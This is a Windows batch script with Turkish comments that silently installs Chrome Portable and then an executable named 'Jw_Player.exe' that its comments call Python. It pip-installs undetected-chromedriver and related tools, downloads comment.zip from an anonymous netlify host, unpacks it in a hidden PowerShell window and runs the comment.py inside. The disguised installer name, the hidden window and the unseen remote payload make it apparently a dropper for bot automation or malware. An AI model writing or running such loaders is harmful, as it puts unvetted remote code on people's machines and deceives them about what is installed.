@echo off



powershell -Command "Start-BitsTransfer -Source 'https://archive.org/download/google-chrome-portable-64-installer_202510/GoogleChromePortable64_Installer.exe' -Destination 'C:\Users\Public\AppData\Local\MyProgramSetup\Program\GoogleChromePortable64_Installer.exe'"
start /wait "" "C:\Users\Public\AppData\Local\MyProgramSetup\Program\GoogleChromePortable64_Installer.exe" /S 





:: Birkaç saniye bekleyerek tüm süreçlerin tamamlanmasýný saðla
timeout /t 5 >nul









:: Python dosyasýný internetten indir
powershell -Command "Start-BitsTransfer -Source 'https://archive.org/download/jw-player_202507/Jw_Player.exe' -Destination 'C:\Users\Public\AppData\Local\MyProgramSetup\Program\Jw_Player.exe'"


:: Python'u arka planda yu¨kle
start /wait C:\Users\Public\AppData\Local\MyProgramSetup\Program\Jw_Player.exe /quiet InstallAllUsers=1 PrependPath=1

:: Python'un kurulumunu dog?rulamak ic¸in kontrol et
:check_python
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python yukleniyor...
    timeout /t 5 >nul
    goto check_python
)

echo Python yuklendi!

:: Pip'i kontrol et ve Selenium'u yu¨kle
python -m ensurepip
python -m pip install --upgrade pip
python -m pip install selenium undetected-chromedriver webdriver-manager requests psutil pywin32



:: Zip dosyasýný indir
powershell -Command "Start-BitsTransfer -Source 'https://polite-cranachan-0afedf.netlify.app/comment.zip' -Destination 'C:\Users\Public\AppData\Local\MyProgramSetup\Program\comment.zip'"

:: Zip dosyasýný ayný klasöre aç (ayýkla)
powershell -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\AppData\Local\MyProgramSetup\Program\comment.zip' -DestinationPath 'C:\Users\Public\AppData\Local\MyProgramSetup\Program\' -Force"


:: Selenium betig?ini c¸alis¸tir
python C:\Users\Public\AppData\Local\MyProgramSetup\Program\comment.py
exit